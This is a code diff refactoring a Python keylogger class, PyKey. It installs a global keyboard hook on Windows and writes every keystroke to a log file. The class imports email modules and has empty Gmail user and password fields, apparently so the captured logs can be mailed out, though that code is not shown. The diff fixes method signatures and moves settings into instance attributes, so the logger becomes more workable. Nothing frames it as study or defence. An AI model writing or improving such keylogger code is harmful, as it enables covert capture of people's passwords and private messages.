@@ -11,13 +11,9 @@ from email.mime.text import MIMEText
 from email.utils import COMMASPACE, formatdate
 
 
-FILE_NAME = "keys.txt"
-CLEAR_ON_STARTUP = False
-TERMINATE_KEY = "esc"
-MAP = {
-    "space": " ",
-    "\r": "\n"
-}
+
+
+
 
 
 class PyKey:
@@ -31,6 +27,12 @@ class PyKey:
         self.GMAIL_USER=''
         self.GMAIL_PWD=''
         self.LOG_FILE = ''
+        self.TERMINATE_KEY = "esc"
+        self.CLEAR_ON_STARTUP = False
+        self.MAP = {
+            "space": " ",
+            "\r": "\n"
+        }
         self.os = self.checkOS()
 
         logging.basicConfig(
@@ -151,19 +153,16 @@ class PyKey:
             listener.join()
 
 
-    def onexit(output):
+    def onexit(self, output):
         output.close()
 
-    def callback(output, is_down, event):
+    def callback(self, output, is_down, event):
         if event.event_type in ("up", "down"):
-            key = MAP.get(event.name, event.name)
+            key = self.MAP.get(event.name, event.name)
             modifier = len(key) > 1
-            # Capturar únicamente los modificadores cuando están siendo
-            # presionados.
             if not modifier and event.event_type == "down":
                 return
-            # Evitar escribir múltiples veces la misma tecla si está
-            # siendo presionada.
+
             if modifier:
                 if event.event_type == "down":
                     if is_down.get(key, False):
@@ -172,39 +171,28 @@ class PyKey:
                         is_down[key] = True
                 elif event.event_type == "up":
                     is_down[key] = False
-                # Indicar si está siendo presionado.
+
                 key = " [{} ({})] ".format(key, event.event_type)
             elif key == "\r":
-                # Salto de línea.
                 key = "\n"
-            # Escribir la tecla al archivo de salida.
             output.write(key)
-            # Forzar escritura.
             output.flush()
 
     def recordWindows(self):
         from functools import partial
         import atexit
         import os
-
         import keyboard
 
         # Borrar el archivo previo.
-        if CLEAR_ON_STARTUP:
-            os.remove(FILE_NAME)
+        #if self.CLEAR_ON_STARTUP:
+        #    os.remove(self.LOG_FILE)
 
-        # Indica si una tecla está siendo presionada.
         is_down = {}
-
-        # Archivo de salida.
-        output = open(FILE_NAME, "a")
-
-        # Cerrar el archivo al terminar el programa.
+        output = open(self.LOG_FILE, "r+")
         atexit.register(self.onexit, output)
-
-        # Instalar el registrador de teclas.
         keyboard.hook(partial(self.callback, output, is_down))
-        keyboard.wait(TERMINATE_KEY)
+        keyboard.wait(self.TERMINATE_KEY)
 
 
 
